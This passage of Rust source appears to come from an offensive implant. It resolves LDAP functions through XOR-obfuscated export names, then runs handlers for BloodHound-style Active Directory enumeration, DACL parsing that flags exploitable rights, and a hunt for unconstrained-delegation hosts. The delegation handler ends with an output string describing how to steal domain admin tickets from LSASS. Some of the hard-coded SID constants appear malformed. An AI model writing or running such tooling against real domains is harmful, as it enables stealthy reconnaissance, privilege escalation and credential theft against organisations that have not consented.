    type LdapGetValsFn = unsafe extern "system" fn(*mut u8, *mut u8, *const u8) -> *mut *mut u8;
    type LdapGetLenFn  = unsafe extern "system" fn(*mut u8, *mut u8, *const u8) -> *mut *mut u8;
    type LdapValFreeFn = unsafe extern "system" fn(*mut *mut u8) -> u32;
    type LdapLenFreeFn = unsafe extern "system" fn(*mut *mut u8) -> u32;
    type LdapMsgFreeFn = unsafe extern "system" fn(*mut u8) -> u32;
    type LdapUnbindFn  = unsafe extern "system" fn(*mut u8) -> u32;

    macro_rules! wl { ($enc:expr, $ty:ty) => {{
        match unsafe { crate::loader::get_export_by_name(wldap, crate::obfs::dec($enc).as_ptr()) } {
            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
            None    => return Err("wldap fn not found".into()),
        }
    }}}

    let fn_init      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
    let fn_setopt    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
    let fn_bind      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x18,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
    let fn_search    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
    let fn_first     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
    let fn_next      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
    let fn_getdn     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x3E,0x34,0x5A], LdapGetDnFn);
    let fn_memfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x3F,0x37,0x3C,0x28,0x3F,0x3F,0x5A], LdapMemFreeFn);
    let fn_getvals   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x5A], LdapGetValsFn);
    let fn_getlenvals= wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x05,0x36,0x3F,0x34,0x5A], LdapGetLenFn);
    let fn_valfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x5A], LdapValFreeFn);
    let fn_lenfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x05,0x36,0x3F,0x34,0x5A], LdapLenFreeFn);
    let fn_msgfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
    let fn_unbind    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x18,0x33,0x34,0x3E,0x5A], LdapUnbindFn);

    let dc_b: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
    let ld = unsafe { fn_init(dc_b.as_ptr(), 389) };
    if ld.is_null() { return Err("ldap_init failed".into()); }
    let ver: u32 = 3;
    unsafe { fn_setopt(ld, 0x11, &ver as *const u32 as *const u8) };
    let br = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486) };
    if br != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_bind: {br:#x}")); }

    let base_b:   Vec<u8> = base_dn.bytes().chain(core::iter::once(0u8)).collect();
    let filter_b: Vec<u8> = filter.bytes().chain(core::iter::once(0u8)).collect();
    let attr_bufs: Vec<Vec<u8>> = attrs.iter()
        .map(|a| a.bytes().chain(core::iter::once(0u8)).collect())
        .collect();
    let mut attr_ptrs: Vec<*const u8> = attr_bufs.iter().map(|b| b.as_ptr()).collect();
    attr_ptrs.push(core::ptr::null());

    let mut res_msg: *mut u8 = core::ptr::null_mut();
    let sr = unsafe {
        fn_search(ld, base_b.as_ptr(), 2, filter_b.as_ptr(), attr_ptrs.as_ptr(), 0, &mut res_msg)
    };
    if sr != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_search: {sr:#x}")); }

    let mut results: Vec<(String, Vec<(String, Vec<String>)>)> = Vec::new();
    let mut entry = unsafe { fn_first(ld, res_msg) };
    while !entry.is_null() {
        let dn_ptr = unsafe { fn_getdn(ld, entry) };
        let dn = if dn_ptr.is_null() { String::new() } else {
            let s = unsafe { std::ffi::CStr::from_ptr(dn_ptr as *const i8) }
                .to_string_lossy().to_string();
            unsafe { fn_memfree(dn_ptr) };
            s
        };
        let mut obj_attrs: Vec<(String, Vec<String>)> = Vec::new();
        for ab in attr_bufs.iter() {
            let aname = String::from_utf8_lossy(&ab[..ab.len()-1]).to_string();
            let vals = unsafe { fn_getvals(ld, entry, ab.as_ptr()) };
            if !vals.is_null() {
                let mut sv: Vec<String> = Vec::new();
                let mut i = 0usize;
                loop {
                    let v = unsafe { *vals.add(i) };
                    if v.is_null() { break; }
                    sv.push(unsafe { std::ffi::CStr::from_ptr(v as *const i8) }
                        .to_string_lossy().to_string());
                    i += 1;
                }
                unsafe { fn_valfree(vals) };
                if !sv.is_empty() { obj_attrs.push((aname, sv)); continue; }
            }
            let bvals = unsafe { fn_getlenvals(ld, entry, ab.as_ptr()) };
            if !bvals.is_null() {
                let mut bv: Vec<String> = Vec::new();
                let mut i = 0usize;
                loop {
                    let bp = unsafe { *bvals.add(i) };
                    if bp.is_null() { break; }
                    let blen = unsafe { *(bp as *const u32) } as usize;
                    let bptr = unsafe { *((bp as *const u8).add(8) as *const *const u8) };
                    if !bptr.is_null() && blen > 0 {
                        let bytes = unsafe { core::slice::from_raw_parts(bptr, blen) };
                        bv.push(format!("HEX:{}", bytes.iter().map(|b| format!("{b:02x}")).collect::<String>()));
                    }
                    i += 1;
                }
                unsafe { fn_lenfree(bvals) };
                if !bv.is_empty() { obj_attrs.push((aname, bv)); }
            }
        }
        results.push((dn, obj_attrs));
        entry = unsafe { fn_next(ld, entry) };
    }

    unsafe { fn_msgfree(res_msg) };
    unsafe { fn_unbind(ld) };
    Ok(results)
}

// ── BloodHound collection ─────────────────────────────────────────────────────
//
// LDAP-based AD enumeration: users, computers, groups, trusts, domain info.
// Args: {"domain":"<fqdn>", "dc":"<hostname>"}
// Output: JSON object with arrays for each object type.

#[cfg(target_os = "windows")]
fn enum_bloodhound(v: &serde_json::Value) -> TaskOutput {
    let domain_fqdn = match std::env::var("USERDNSDOMAIN").ok()
        .or_else(|| v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string()))
    {
        Some(d) => d.to_lowercase(),
        None => return TaskOutput::failure("bloodhound: USERDNSDOMAIN not set"),
    };
    let dc = v.get("dc").and_then(|s| s.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| domain_fqdn.clone());
    let base_dn: String = domain_fqdn.split('.')
        .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");
    let config_dn = format!("CN=Configuration,{base_dn}");

    let wldap = match wldap_load() {
        Ok(b) => b,
        Err(e) => return TaskOutput::failure(&format!("bloodhound: {e}")),
    };

    let objs_to_json = |objs: Vec<(String, Vec<(String, Vec<String>)>)>| -> Vec<serde_json::Value> {
        objs.into_iter().map(|(dn, attrs)| {
            let mut m = serde_json::json!({"dn": dn});
            for (k, vals) in attrs {
                m[k] = serde_json::Value::Array(
                    vals.into_iter().map(serde_json::Value::String).collect()
                );
            }
            m
        }).collect()
    };

    // Users
    let users = ldap_enum(wldap, &dc, &base_dn,
        "(&(objectClass=user)(!objectClass=computer))",
        &["sAMAccountName","distinguishedName","userAccountControl","adminCount",
          "memberOf","lastLogon","pwdLastSet","servicePrincipalName","description"])
        .map(objs_to_json).unwrap_or_default();

    // Computers
    let computers = ldap_enum(wldap, &dc, &base_dn,
        "(objectClass=computer)",
        &["sAMAccountName","distinguishedName","dNSHostName","operatingSystem",
          "operatingSystemVersion","userAccountControl","lastLogon"])
        .map(objs_to_json).unwrap_or_default();

    // Groups
    let groups = ldap_enum(wldap, &dc, &base_dn,
        "(objectClass=group)",
        &["sAMAccountName","distinguishedName","member","adminCount","groupType","description"])
        .map(objs_to_json).unwrap_or_default();

    // Domain trusts
    let trusts = ldap_enum(wldap, &dc, &base_dn,
        "(objectClass=trustedDomain)",
        &["flatName","trustPartner","trustType","trustAttributes","trustDirection"])
        .map(objs_to_json).unwrap_or_default();

    // Domain info
    let domain_info = ldap_enum(wldap, &dc, &base_dn,
        "(objectClass=domain)",
        &["dc","objectSid","msDS-Behavior-Version","lockoutThreshold","minPwdLength"])
        .map(objs_to_json).unwrap_or_default();

    // GPO objects
    let gpos = ldap_enum(wldap, &dc, &base_dn,
        "(objectClass=groupPolicyContainer)",
        &["displayName","gPCFileSysPath","flags","versionNumber"])
        .map(objs_to_json).unwrap_or_default();

    // Enrollment Services (CAs)
    let cas = ldap_enum(wldap, &dc, &config_dn,
        "(objectClass=pKIEnrollmentService)",
        &["cn","dNSHostName","certificateTemplates","cACertificate"])
        .map(objs_to_json).unwrap_or_default();

    let result = serde_json::json!({
        "domain":     domain_fqdn,
        "dc":         dc,
        "stats": {
            "users":     users.len(),
            "computers": computers.len(),
            "groups":    groups.len(),
            "trusts":    trusts.len(),
            "gpos":      gpos.len(),
            "cas":       cas.len(),
        },
        "users":     users,
        "computers": computers,
        "groups":    groups,
        "trusts":    trusts,
        "domain":    domain_info,
        "gpos":      gpos,
        "cas":       cas,
    });
    TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default())
}

// ── ACL enumeration ───────────────────────────────────────────────────────────
//
// Enumerates DACLs on sensitive AD objects and reports interesting ACEs.
// Parses binary nTSecurityDescriptor from LDAP and extracts ACEs with access masks.
// Args: {"domain":"<fqdn>", "dc":"<hostname>", "target":"<dn or 'domain'>"}

#[cfg(target_os = "windows")]
fn enum_acl(v: &serde_json::Value) -> TaskOutput {
    let domain_fqdn = match std::env::var("USERDNSDOMAIN").ok()
        .or_else(|| v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string()))
    {
        Some(d) => d.to_lowercase(),
        None => return TaskOutput::failure("acl: USERDNSDOMAIN not set"),
    };
    let dc = v.get("dc").and_then(|s| s.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| domain_fqdn.clone());
    let base_dn: String = domain_fqdn.split('.')
        .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");

    // What to enumerate: default to domain root + AdminSDHolder + DCs OU
    let targets: Vec<(&str, &str)> = vec![
        ("domain root", "(objectClass=domain)"),
        ("admin groups", "(&(objectClass=group)(adminCount=1))"),
        ("AdminSDHolder", "(cn=AdminSDHolder)"),
        ("domain controllers", "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"),
    ];

    let wldap = match wldap_load() {
        Ok(b) => b,
        Err(e) => return TaskOutput::failure(&format!("acl: {e}")),
    };

    let mut all_acls: Vec<serde_json::Value> = Vec::new();

    for (label, filter) in &targets {
        let search_base = if filter.contains("AdminSDHolder") {
            format!("CN=System,{base_dn}")
        } else {
            base_dn.clone()
        };

        let objs = match ldap_enum(wldap, &dc, &search_base, filter, &["distinguishedName","nTSecurityDescriptor","cn","sAMAccountName"]) {
            Ok(r) => r,
            Err(_) => continue,
        };

        for (dn, attrs) in objs {
            // Find the nTSecurityDescriptor
            let sd_hex = attrs.iter()
                .find(|(k, _)| k == "nTSecurityDescriptor")
                .and_then(|(_, v)| v.first())
                .and_then(|s| s.strip_prefix("HEX:").map(|h| h.to_string()));

            let cn = attrs.iter()
                .find(|(k, _)| k == "cn" || k == "sAMAccountName")
                .and_then(|(_, v)| v.first())
                .cloned()
                .unwrap_or_else(|| dn.split(',').next().unwrap_or("").to_string());

            let aces = if let Some(hex) = sd_hex {
                parse_sd_aces(&hex)
            } else {
                Vec::new()
            };

            all_acls.push(serde_json::json!({
                "category": label,
                "object":   cn,
                "dn":       dn,
                "ace_count": aces.len(),
                "aces":     aces,
            }));
        }
    }

    let result = serde_json::json!({
        "domain":   domain_fqdn,
        "dc":       dc,
        "objects":  all_acls,
    });
    TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default())
}

// Parses a hex-encoded binary Security Descriptor and returns ACEs as JSON values.
#[cfg(target_os = "windows")]
fn parse_sd_aces(hex: &str) -> Vec<serde_json::Value> {
    // Hex-decode
    let sd: Vec<u8> = (0..hex.len())
        .step_by(2)
        .filter_map(|i| u8::from_str_radix(&hex[i..i+2], 16).ok())
        .collect();

    if sd.len() < 20 { return Vec::new(); }

    // SECURITY_DESCRIPTOR: Revision(1)+Sbz1(1)+Control(2)+OffOwner(4)+OffGroup(4)+OffSacl(4)+OffDacl(4)
    let control   = u16::from_le_bytes([sd[2], sd[3]]);
    let dacl_off  = u32::from_le_bytes([sd[16], sd[17], sd[18], sd[19]]) as usize;

    if control & 0x0004 == 0 || dacl_off == 0 || dacl_off + 8 > sd.len() {
        return Vec::new(); // no DACL
    }

    // ACL header: AclRevision(1)+Sbz1(1)+AclSize(2)+AceCount(2)+Sbz2(2)
    let ace_count = u16::from_le_bytes([sd[dacl_off+4], sd[dacl_off+5]]) as usize;
    let mut pos = dacl_off + 8;
    let mut aces: Vec<serde_json::Value> = Vec::new();

    // Well-known SID mapping (hex prefix → friendly name)
    let sid_name = |sid_bytes: &[u8]| -> String {
        let hex: String = sid_bytes.iter().map(|b| format!("{b:02x}")).collect();
        // Map common SIDs
        match hex.as_str() {
            "010200000000000520000000200200000" => "Domain Admins".to_string(),
            "0102000000000005200000002200000" => "Domain Controllers".to_string(),
            _ => {
                if sid_bytes.len() >= 8 {
                    format!("SID:{hex}")
                } else {
                    "SID:<invalid>".to_string()
                }
            }
        }
    };

    // Access mask → description
    let mask_desc = |mask: u32| -> Vec<&'static str> {
        let mut desc = Vec::new();
        if mask & 0xF01FF == 0xF01FF { desc.push("FullControl"); }
        else {
            if mask & 0x00020000 != 0 { desc.push("ReadControl"); }
            if mask & 0x00040000 != 0 { desc.push("WriteDacl"); }
            if mask & 0x00080000 != 0 { desc.push("WriteOwner"); }
            if mask & 0x00000001 != 0 { desc.push("ListChildren"); }
            if mask & 0x00000002 != 0 { desc.push("CreateChild"); }
            if mask & 0x00000004 != 0 { desc.push("DeleteChild"); }
            if mask & 0x00000010 != 0 { desc.push("ReadProperty"); }
            if mask & 0x00000020 != 0 { desc.push("WriteProperty"); }
            if mask & 0x00000040 != 0 { desc.push("DeleteTree"); }
            if mask & 0x00000100 != 0 { desc.push("ControlAccess"); }
            if mask & 0x00000008 != 0 { desc.push("Self-Write"); }
        }
        desc
    };

    for _ in 0..ace_count {
        if pos + 4 > sd.len() { break; }
        let ace_type  = sd[pos];
        let ace_flags = sd[pos+1];
        let ace_size  = u16::from_le_bytes([sd[pos+2], sd[pos+3]]) as usize;
        if ace_size < 4 || pos + ace_size > sd.len() { break; }

        let ace_body = &sd[pos+4..pos+ace_size];

        // Parse ACCESS_ALLOWED_ACE (type 0), ACCESS_DENIED_ACE (type 1),
        //  ACCESS_ALLOWED_OBJECT_ACE (type 5), ACCESS_DENIED_OBJECT_ACE (type 6)
        let type_name = match ace_type {
            0 => "ALLOW",
            1 => "DENY",
            5 => "ALLOW_OBJECT",
            6 => "DENY_OBJECT",
            _ => "OTHER",
        };

        if ace_body.len() >= 8 {
            let access_mask = u32::from_le_bytes([ace_body[0], ace_body[1], ace_body[2], ace_body[3]]);

            let (obj_type_guid, sid_start) = if ace_type == 5 || ace_type == 6 {
                if ace_body.len() >= 24 {
                    let flags = u32::from_le_bytes([ace_body[4], ace_body[5], ace_body[6], ace_body[7]]);
                    let skip = if flags & 0x1 != 0 { 16 } else { 0 }; // ObjectType GUID
                    let skip2 = if flags & 0x2 != 0 { 16 } else { 0 }; // InheritedObjectType GUID
                    let guid_hex = if flags & 0x1 != 0 {
                        let g = &ace_body[8..24];
                        Some(format!("{:08x}-{:04x}-{:04x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
                            u32::from_le_bytes([g[0],g[1],g[2],g[3]]),
                            u16::from_le_bytes([g[4],g[5]]),
                            u16::from_le_bytes([g[6],g[7]]),
                            g[8],g[9],g[10],g[11],g[12],g[13],g[14],g[15]))
                    } else { None };
                    (guid_hex, 8 + skip + skip2)
                } else { (None, 4) }
            } else { (None, 4) };

            let sid_bytes = &ace_body[sid_start..];
            let sid_str = if sid_bytes.len() >= 8 {
                sid_name(sid_bytes)
            } else {
                "SID:<short>".to_string()
            };

            // Only report interesting (non-trivial) ACEs
            let rights = mask_desc(access_mask);
            let interesting = access_mask & 0x000C0000 != 0  // WriteDacl/WriteOwner
                || access_mask & 0x00000020 != 0             // WriteProperty
                || access_mask & 0xF01FF == 0xF01FF;         // FullControl

            if interesting || ace_type == 1 || ace_type == 6 {
                let mut ace_j = serde_json::json!({
                    "type":        type_name,
                    "flags":       ace_flags,
                    "access_mask": format!("{access_mask:#010x}"),
                    "rights":      rights,
                    "sid":         sid_str,
                });
                if let Some(g) = obj_type_guid {
                    ace_j["object_type"] = serde_json::Value::String(g);
                }
                aces.push(ace_j);
            }
        }
        pos += ace_size;
    }

    aces
}

// ── Unconstrained Delegation Enumeration ─────────────────────────────────────
//
// Finds computers and users with unconstrained Kerberos delegation enabled.
// These are high-value targets: anyone authenticating to them yields a TGT.
// Args: {"domain":"<fqdn>","dc":"<hostname>"}

#[cfg(target_os = "windows")]
fn enum_unconstrained_deleg(v: &serde_json::Value) -> TaskOutput {
    let domain_fqdn = match std::env::var("USERDNSDOMAIN").ok()
        .or_else(|| v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string()))
    {
        Some(d) => d.to_lowercase(),
        None => return TaskOutput::failure("unconstrained-deleg: USERDNSDOMAIN not set"),
    };
    let dc = v.get("dc").and_then(|s| s.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| domain_fqdn.clone());
    let base_dn: String = domain_fqdn.split('.')
        .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");

    let wldap = match wldap_load() {
        Ok(b) => b,
        Err(e) => return TaskOutput::failure(&format!("unconstrained-deleg: {e}")),
    };

    // UAC flag: TRUSTED_FOR_DELEGATION = 0x80000 (524288)
    // Filter: computers + users with unconstrained delegation (excluding krbtgt)
    let filter_comps = "(userAccountControl:1.2.840.113556.1.4.803:=524288)";
    let attrs = ["sAMAccountName","distinguishedName","userAccountControl",
                 "operatingSystem","dNSHostName","servicePrincipalName"];

    let objects = match ldap_enum(wldap, &dc, &base_dn, filter_comps, &attrs) {
        Ok(r) => r,
        Err(e) => return TaskOutput::failure(&format!("unconstrained-deleg: {e}")),
    };

    let mut computers = Vec::new();
    let mut users = Vec::new();
    for (dn, obj_attrs) in &objects {
        let get = |n: &str| -> String {
            obj_attrs.iter().find(|(k, _)| k == n)
                .and_then(|(_, v)| v.first())
                .cloned().unwrap_or_default()
        };
        let uac: u64 = get("userAccountControl").parse().unwrap_or(0);
        let name = get("sAMAccountName");
        if name.eq_ignore_ascii_case("krbtgt") { continue; }
        let entry = serde_json::json!({
            "dn": dn,
            "name": name,
            "dns_host": get("dNSHostName"),
            "uac": format!("{uac:#010x}"),
            "os": get("operatingSystem"),
            "spns": obj_attrs.iter().find(|(k, _)| k == "servicePrincipalName")
                        .map(|(_, v)| v.clone()).unwrap_or_default(),
        });
        if uac & 0x1000 != 0 { // WORKSTATION_TRUST_ACCOUNT
            computers.push(entry);
        } else {
            users.push(entry);
        }
    }

    let result = serde_json::json!({
        "domain":   domain_fqdn,
        "dc":       dc,
        "unconstrained_computers": computers,
        "unconstrained_users":     users,
        "total":    objects.len(),
        "attack_path": "Compromise any listed machine → wait for admin/DA to authenticate → extract TGT from LSASS",
    });
    TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default())
}
